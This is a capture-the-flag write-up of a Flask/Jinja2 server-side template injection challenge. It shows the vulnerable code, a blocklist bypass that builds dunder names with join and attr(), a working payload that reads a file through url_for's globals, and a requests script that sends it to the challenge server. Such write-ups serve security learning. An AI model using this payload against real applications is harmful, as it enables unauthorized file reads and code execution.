# Temporary Destruction — Writeup

- **Category:** Web
- **Flag format:** `CIT{}`
- **Target:** `http://23.179.17.92:5558`
- **Final flag:** `CIT{55T1_R3m0t3_C0d3_3x3cut1on}`

---

## 1. Initial observations

The challenge did not provide a description, so the first step was to inspect the provided files and source code.

From the application source:

```python
from flask import Flask, render_template_string, request
import re

app = Flask(__name__)

BLOCKED = re.compile(r'__\w+__')
```

The key detail here is that the app imports and uses **`render_template_string`** directly on user-controlled input.

Later in the request handler:

```python
if request.method == 'POST':
    raw_input = request.form.get('user_input', '')

    if BLOCKED.search(raw_input):
        output = 'rejected.'
        is_error = True
    else:
        try:
            output = render_template_string(raw_input)
        except Exception:
            output = 'error.'
            is_error = True
```

This is the vulnerability. The application takes the submitted form field `user_input` and feeds it into Jinja2's template engine.

That means this challenge is a classic **Server-Side Template Injection (SSTI)** in Flask/Jinja2.

---

## 2. Front-end behavior

The HTML form in `app.py` shows the exact parameter name expected by the server:

```html
<form method="POST" action="/" autocomplete="off">
    <textarea name="user_input" id="inp" rows="5" spellcheck="false">{{ raw_input }}</textarea>
</form>
```

This detail mattered during verification because using the wrong field name only returned the default page and did not evaluate our payload.

The rendered response is displayed inside:

```html
<pre>{{ output }}</pre>
```

So any successful SSTI result would appear in that `<pre>` block.

---

## 3. Blacklist analysis

The app tries to block dangerous expressions with this regex:

```python
BLOCKED = re.compile(r'__\w+__')
```

This blocks strings that literally contain patterns such as:

- `__class__`
- `__mro__`
- `__subclasses__`
- `__globals__`
- `__builtins__`

That means direct Jinja2 SSTI payloads using dunder attributes would be rejected.

However, the defense is weak because it only scans the **raw input string** before rendering. If we can **construct the dunder name dynamically at runtime**, the regex never sees the forbidden token.

For example, this string does **not** literally contain `__globals__`:

```jinja2
['_','_','globals','_','_']|join
```

But Jinja2 evaluates it to:

```python
"__globals__"
```

So the blacklist can be bypassed.

---

## 4. Confirming SSTI

A simple first test in Jinja2 SSTI is arithmetic:

```jinja2
{{ 7*7 }}
```

If the server evaluates it, the output should be `49`.

Given the source code, this was enough to conclude the app was evaluating Jinja templates, but the more important step was getting from SSTI to file read.

---

## 5. Useful source details from Dockerfile

The Dockerfile revealed where the flag is stored:

```dockerfile
RUN echo -n "CIT{test_flag}" > /tmp/flag.txt && \
    chmod 444 /tmp/flag.txt
```

Important observations:

1. The flag file path is **`/tmp/flag.txt`**.
2. The local Docker image only contains a placeholder `CIT{test_flag}`.
3. On the remote instance, the real flag would likely be mounted or replaced at the same path.

So the goal became:
- exploit SSTI,
- reach Python builtins,
- call `open('/tmp/flag.txt').read()`.

---

## 6. Exploit strategy

In Flask/Jinja2, one common path to Python internals is through a known function object exposed to templates, such as `url_for`.

A Python function object has a `__globals__` dictionary, which gives access to the global namespace. From there we can get `__builtins__`, and from there we can get `open`.

The conceptual chain is:

```python
url_for.__globals__.__builtins__.open('/tmp/flag.txt').read()
```

But writing that directly would trigger the blacklist because it contains literal dunder names.

So we rewrote those attribute names dynamically.

### Building blocked names dynamically

- `__globals__` → `['_','_','globals','_','_']|join`
- `__builtins__` → `['_','_','builtins','_','_']|join`

Then we used Jinja2's `attr()` filter to fetch the attribute by name.

---

## 7. Working payload

The final payload was:

```jinja2
{{ (url_for|attr(['_','_','globals','_','_']|join)).get(['_','_','builtins','_','_']|join).get('open')('/tmp/flag.txt').read() }}
```

### What it does step by step

1. `url_for`
   - Flask exposes this function in the Jinja environment.

2. `|attr(['_','_','globals','_','_']|join)`
   - Builds the string `__globals__` dynamically.
   - Accesses `url_for.__globals__`.

3. `.get(['_','_','builtins','_','_']|join)`
   - Builds `__builtins__` dynamically.
   - Accesses the builtins dictionary.

4. `.get('open')('/tmp/flag.txt')`
   - Retrieves Python's `open` function.
   - Opens the flag file.

5. `.read()`
   - Reads the contents of the file.

6. `{{ ... }}`
   - Causes the result to be rendered into the page.

Because the forbidden dunder names were created **at render time**, the blacklist regex never matched them.

---

## 8. Sending the exploit

A Python `requests` script was used to send the payload to the correct form field:

```python
import requests, re, html
url='http://23.179.17.92:5558/'
payload="{{ (url_for|attr(['_','_','globals','_','_']|join)).get(['_','_','builtins','_','_']|join).get('open')('/tmp/flag.txt').read() }}"
r=requests.post(url,data={'user_input':payload},timeout=10)
text=html.unescape(r.text)
m=re.search(r'<div class="response[^>]*>.*?<pre>(.*?)</pre>', text, re.S)
print(m.group(1).strip())
```

The important detail here is the POST body:

```python
data={'user_input': payload}
```

The field name must be `user_input`.

---

## 9. Verification result

The live service returned:

```text
CIT{55T1_R3m0t3_C0d3_3x3cut1on}
```

This was extracted directly from the rendered `<pre>` block and matched a `CIT{...}` pattern in the full HTML response as well.

---

## 10. Dead end / correction during verification

One minor issue during rechecking was that the first verification request used the wrong form field name. Because of that, the server simply rendered the normal page without evaluating the payload.

Observation:
- No SSTI output appeared.
- The response looked like the default page.

Fix:
- Read the source again.
- Confirm the correct parameter name is `user_input`.
- Replay the exploit using that field.

After correcting that, the flag was returned immediately.

---

## 11. Why the blacklist failed

The blacklist only looked for this pattern in the raw input:

```python
__\w+__
```

That means it was relying on **string matching**, not on sandboxing or restricting the Jinja environment.

This approach fails because:

1. Dangerous names can be constructed dynamically.
2. Jinja2 offers filters like `attr()` that let us resolve attributes from strings.
3. Once Python objects are reachable, it becomes possible to access builtins and read files.

A blacklist of forbidden substrings is not a safe defense against SSTI.

---

## 12. Real vulnerability summary

This challenge is vulnerable because it does this:

```python
render_template_string(raw_input)
```

on user-controlled input.

That allows arbitrary Jinja2 expressions to be evaluated server-side. By traversing from a Flask-exposed function (`url_for`) into Python globals and builtins, we achieved arbitrary file read and extracted the flag.

---

## 13. Final answer

```text
CIT{55T1_R3m0t3_C0d3_3x3cut1on}
```

---

## 14. Short solve summary

- Read the Flask source.
- Identified `render_template_string(raw_input)` → Jinja2 SSTI.
- Noticed blacklist blocking literal dunder names only.
- Bypassed blacklist by dynamically building `__globals__` and `__builtins__` with `join`.
- Used Flask's `url_for` function as a pivot into Python internals.
- Read `/tmp/flag.txt`.
- Extracted the real remote flag.
